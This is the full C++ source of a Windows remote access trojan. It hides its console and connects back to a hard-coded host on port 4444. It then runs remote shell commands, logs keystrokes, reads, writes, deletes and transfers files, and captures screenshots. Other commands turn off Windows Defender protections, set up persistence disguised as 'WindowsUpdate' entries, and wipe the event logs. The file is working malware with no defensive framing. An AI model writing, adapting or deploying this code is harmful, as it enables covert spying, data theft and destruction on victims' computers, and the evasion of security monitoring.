#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <array>
#include <direct.h>
#include <fstream>
#include <vector>
#include <sstream>
#include <map>
#include <cstdint>

#pragma comment(lib, "ws2_32.lib")
using namespace std;

#define SERVER_IP "192.168.0.91"
#define SERVER_PORT 4444
#define BS 4096

bool send_all(SOCKET s, const char *b, int l)
{
    int t = 0;
    while (t < l)
    {
        int n = send(s, b + t, l - t, 0);
        if (n == SOCKET_ERROR)
            return false;
        t += n;
    }
    return true;
}

bool recv_exact(SOCKET s, char *b, int l)
{
    int t = 0;
    while (t < l)
    {
        int n = recv(s, b + t, l - t, 0);
        if (n <= 0)
            return false;
        t += n;
    }
    return true;
}

bool send_msg(SOCKET s, const string &m)
{
    uint32_t l = m.size();
    char h[4] = {(char)(l & 0xFF), (char)((l >> 8) & 0xFF), (char)((l >> 16) & 0xFF), (char)((l >> 24) & 0xFF)};
    return send_all(s, h, 4) && send_all(s, m.c_str(), l);
}

string recv_msg(SOCKET s)
{
    char h[4];
    if (!recv_exact(s, h, 4))
        return "";
    uint32_t l = (uint8_t)h[0] | ((uint32_t)(uint8_t)h[1] << 8) | ((uint32_t)(uint8_t)h[2] << 16) | ((uint32_t)(uint8_t)h[3] << 24);
    if (l > 100000000)
        return "";
    string m(l, '\0');
    if (!recv_exact(s, &m[0], l))
        return "";
    return m;
}

string exec_cmd(const string &c)
{
    string r;
    array<char, 4096> b;
    FILE *p = _popen((c + " 2>&1").c_str(), "r");
    if (!p)
        return "[-] Execution failed.\n";
    while (fgets(b.data(), b.size(), p))
        r += b.data();
    _pclose(p);
    return r.empty() ? "[+] Done.\n" : r;
}

vector<string> split(const string &s, char d)
{
    vector<string> r;
    string t;
    istringstream ss(s);
    while (getline(ss, t, d))
        r.push_back(t);
    return r;
}

string tolower_str(string s)
{
    for (char &c : s)
        c = tolower(c);
    return s;
}

bool keylogging = false;
string keylog_buf;
DWORD WINAPI keylog_thread(LPVOID)
{
    while (keylogging)
    {
        for (int k = 8; k <= 190; k++)
        {
            if (GetAsyncKeyState(k) & 1)
            {
                if (k == VK_RETURN)
                    keylog_buf += "\n";
                else if (k == VK_BACK)
                    keylog_buf += "[BS]";
                else if (k == VK_TAB)
                    keylog_buf += "[TAB]";
                else if (k == VK_SPACE)
                    keylog_buf += " ";
                else if (k >= 0x30 && k <= 0x5A)
                {
                    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
                    char c = (char)k;
                    if (!shift && k >= 'A' && k <= 'Z')
                        c += 32;
                    keylog_buf += c;
                }
            }
        }
        Sleep(15);
    }
    return 0;
}

void hide()
{
    HWND h;
    AllocConsole();
    h = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(h, SW_HIDE);
}

int main()
{
    hide();
    WSADATA w;
    WSAStartup(MAKEWORD(2, 2), &w);

    while (true)
    {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &sa.sin_addr);

        if (connect(s, (sockaddr *)&sa, sizeof(sa)) == 0)
        {
            while (true)
            {
                string cmd = recv_msg(s);
                if (cmd.empty())
                    break;

                string low = tolower_str(cmd);
                vector<string> p = split(cmd, ' ');

                if (low == "exit" || low == "quit")
                    break;

                if (low == "keylog_start" && !keylogging)
                {
                    keylogging = true;
                    CreateThread(NULL, 0, keylog_thread, NULL, 0, NULL);
                    send_msg(s, "[+] Keylogger started.\n");
                }
                else if (low == "keylog_dump")
                {
                    send_msg(s, keylog_buf.empty() ? "[+] No keys logged.\n" : keylog_buf);
                    keylog_buf.clear();
                }
                else if (low == "keylog_stop")
                {
                    keylogging = false;
                    send_msg(s, "[+] Keylogger stopped.\n");
                }
                else if (cmd.find("cd ") == 0)
                {
                    string path = cmd.substr(3);
                    if (path.empty())
                    {
                        char cwd[1024];
                        _getcwd(cwd, sizeof(cwd));
                        send_msg(s, string(cwd) + "\n");
                    }
                    else if (_chdir(path.c_str()) == 0)
                    {
                        char cwd[1024];
                        _getcwd(cwd, sizeof(cwd));
                        send_msg(s, string("-> ") + cwd + "\n");
                    }
                    else
                        send_msg(s, "[-] cd failed.\n");
                }
                else if (p[0] == "read" && p.size() >= 2)
                {
                    string fp = cmd.substr(5);
                    ifstream f(fp);
                    if (f)
                    {
                        string c((istreambuf_iterator<char>(f)), istreambuf_iterator<char>());
                        f.close();
                        send_msg(s, c + "\n--- EOF (" + to_string(c.size()) + " bytes) ---\n");
                    }
                    else
                        send_msg(s, "[-] Cannot read: " + fp + "\n");
                }
                else if (p[0] == "write" && p.size() >= 3)
                {
                    string fp = p[1];
                    string content = cmd.substr(6 + fp.size() + 1);
                    ofstream f(fp);
                    if (f)
                    {
                        f << content;
                        f.close();
                        send_msg(s, "[+] Written: " + fp + "\n");
                    }
                    else
                        send_msg(s, "[-] Cannot write.\n");
                }
                else if (p[0] == "delete" && p.size() >= 2)
                {
                    string tgt = cmd.substr(7);
                    DWORD a = GetFileAttributesA(tgt.c_str());
                    if (a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY))
                        send_msg(s, exec_cmd("cmd.exe /c rmdir /s /q \"" + tgt + "\""));
                    else if (DeleteFileA(tgt.c_str()))
                        send_msg(s, "[+] Deleted: " + tgt + "\n");
                    else
                        send_msg(s, exec_cmd("cmd.exe /c del /f /q \"" + tgt + "\""));
                }
                else if (p[0] == "mkdir" && p.size() >= 2)
                {
                    string tgt = cmd.substr(6);
                    if (CreateDirectoryA(tgt.c_str(), NULL))
                        send_msg(s, "[+] Created: " + tgt + "\n");
                    else
                        send_msg(s, "[-] Failed.\n");
                }
                else if (p[0] == "download" && p.size() >= 3)
                {
                    string fp = p[1];
                    ifstream f(fp, ios::binary | ios::ate);
                    if (!f)
                    {
                        send_msg(s, "[-] File not found.\n");
                        send_msg(s, "0");
                    }
                    else
                    {
                        streamsize sz = f.tellg();
                        f.seekg(0, ios::beg);
                        send_msg(s, "[+] Sending file.\n");
                        send_msg(s, to_string(sz));
                        string ack = recv_msg(s);
                        if (ack.find("ok") != string::npos)
                        {
                            vector<char> b(BS);
                            while (f.read(b.data(), b.size()) || f.gcount() > 0)
                                send_all(s, b.data(), f.gcount());
                        }
                        f.close();
                    }
                }
                else if (p[0] == "upload" && p.size() >= 3)
                {
                    string fp = p[1];
                    streamsize sz = stoll(p[2]);
                    send_msg(s, "READY");
                    ofstream f(fp, ios::binary);
                    if (!f)
                        send_msg(s, "[-] Cannot create file.\n");
                    else
                    {
                        vector<char> b(BS);
                        streamsize rem = sz;
                        while (rem > 0)
                        {
                            int rd = min((streamsize)BS, rem);
                            if (!recv_exact(s, b.data(), rd))
                                break;
                            f.write(b.data(), rd);
                            rem -= rd;
                        }
                        f.close();
                        send_msg(s, "[+] File received: " + fp + "\n");
                    }
                }
                else if (low == "screenshot")
                {
                    char tp[MAX_PATH], sp[MAX_PATH];
                    GetTempPathA(MAX_PATH, tp);
                    sprintf_s(sp, "%s\\s_%d.bmp", tp, GetCurrentProcessId());
                    string ps = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; "
                                "$s=[Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,"
                                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); "
                                "$g=[Drawing.Graphics]::FromImage($s); "
                                "$g.CopyFromScreen(0,0,0,0,$s.Size); "
                                "$s.Save('" +
                                string(sp) + "'); exit\" 2>&1";
                    system(ps.c_str());
                    Sleep(500);
                    ifstream f(sp, ios::binary | ios::ate);
                    if (!f)
                        send_msg(s, "[-] Screenshot failed.\n");
                    else
                    {
                        streamsize sz = f.tellg();
                        f.seekg(0, ios::beg);
                        send_msg(s, "[+] Screenshot ready.\n");
                        send_msg(s, to_string(sz));
                        string ack = recv_msg(s);
                        if (ack.find("ok") != string::npos)
                        {
                            vector<char> b(BS);
                            while (f.read(b.data(), b.size()) || f.gcount() > 0)
                                send_all(s, b.data(), f.gcount());
                        }
                        f.close();
                        DeleteFileA(sp);
                    }
                }
                else if (low == "disable_defender")
                {
                    send_msg(s, exec_cmd("powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true; "
                                         "Set-MpPreference -DisableBehaviorMonitoring $true; "
                                         "Set-MpPreference -DisableBlockAtFirstSeen $true; "
                                         "Set-MpPreference -DisableIOAVProtection $true; "
                                         "Set-MpPreference -SubmitSamplesConsent 2; "
                                         "Write-Output 'Defender Disabled'\""));
                }
                else if (low == "persistence")
                {
                    char ep[MAX_PATH];
                    GetModuleFileNameA(NULL, ep, MAX_PATH);
                    string r;
                    r += exec_cmd("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "
                                  "\"WindowsUpdate\" /t REG_SZ /d \"" +
                                  string(ep) + "\" /f");
                    r += exec_cmd("schtasks /create /tn \"WindowsUpdateTask\" /tr \"" + string(ep) + "\" /sc onlogon /rl highest /f");
                    r += exec_cmd("copy \"" + string(ep) + "\" \"%APPDATA%\\Microsoft\\Windows\\"
                                                           "Start Menu\\Programs\\Startup\\\" /y");
                    send_msg(s, "[+] Persistence installed.\n" + r);
                }
                else if (low == "clearlogs")
                {
                    send_msg(s, exec_cmd("wevtutil cl Application & wevtutil cl System & "
                                         "wevtutil cl Security & powershell -Command \"Clear-EventLog -LogName "
                                         "Application,System,Security -ErrorAction SilentlyContinue\""));
                }
                else
                {
                    send_msg(s, exec_cmd(cmd));
                }
            }
        }
        closesocket(s);
        Sleep(5000);
    }
    WSACleanup();
    return 0;
}
